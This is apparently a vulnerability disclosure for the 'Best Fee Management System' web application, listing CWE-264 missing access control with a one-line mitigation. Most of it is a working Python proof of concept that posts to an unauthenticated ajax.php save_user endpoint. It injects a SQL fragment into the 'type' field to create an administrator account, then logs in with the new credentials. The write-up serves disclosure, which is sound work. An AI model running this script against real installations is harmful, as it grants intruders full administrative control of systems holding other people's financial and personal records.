Best Fee Management System POC
---
## Vulnerability Type
CWE-264: Permissions, Privileges, and Access Controls

## Mitigation
There must be access control for the sentitive interfaces.

## Impact
Allows an attacker to gain full control of the system information.

## Proof of Concept
Setup: `pip install httpx`

```python
import httpx


response = httpx.post(
    url="http://localhost/click_fees/ajax.php?action=save_user",
    data={
        "name": "evil",
        "username": "evil@mars.io",
        "password": "evil",
        "type": "1'#", # SQL injection is necessary, beacuase of a server bug.
    },
    proxies="http://localhost:8080",
)

print(response.text)
```

## Steps To Reproduce
After execute POC script, attacker can login system with:
* username: evil@mars.io 
* password: evil
